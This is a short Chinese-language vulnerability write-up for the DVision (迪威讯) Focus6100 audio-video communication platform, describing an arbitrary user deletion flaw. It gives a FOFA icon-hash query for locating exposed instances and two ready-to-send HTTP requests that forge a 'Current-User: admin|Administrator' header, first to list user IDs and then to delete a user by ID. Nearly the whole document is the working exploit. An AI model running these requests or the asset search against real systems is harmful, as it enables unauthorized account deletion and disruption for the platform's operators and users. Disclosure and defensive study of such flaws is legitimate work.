# 迪威讯Focus6100音视频通讯平台存在任意用户删除

# 一、漏洞简介
迪威讯Focus6100音视频通讯平台存在任意用户删除

# 二、影响版本
+ 迪威讯Focus6100音视频通讯平台

# 三、资产测绘
+ fofa`web.icon=="bbc933535a6bfe478afb1fd0b3c470bf"`
+ 特征

![1727236496776-a86037c1-f827-4701-8df6-d3ff921c09b3.png](./img/iCp6n463PYDv5NDp/1727236496776-a86037c1-f827-4701-8df6-d3ff921c09b3-020946.png)

# 四 、漏洞复现
先获取ID

```java
GET /portal/rest/users HTTP/1.1
Host: 
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
```

![1727236976160-7d286d29-24f9-40e3-86d0-98105090b8a8.png](./img/iCp6n463PYDv5NDp/1727236976160-7d286d29-24f9-40e3-86d0-98105090b8a8-624829.png)

利用获取ID删除用户

```java
DELETE /portal/rest/users/ff8080819200f6750192274beccc0019 HTTP/1.1
Host: 
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
```

![1727237124222-466859ab-cbe1-4ef1-a344-0acb772d2535.png](./img/iCp6n463PYDv5NDp/1727237124222-466859ab-cbe1-4ef1-a344-0acb772d2535-711660.png)



> 更新: 2024-10-22 09:36:09  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xl9p6cln9rou66gy>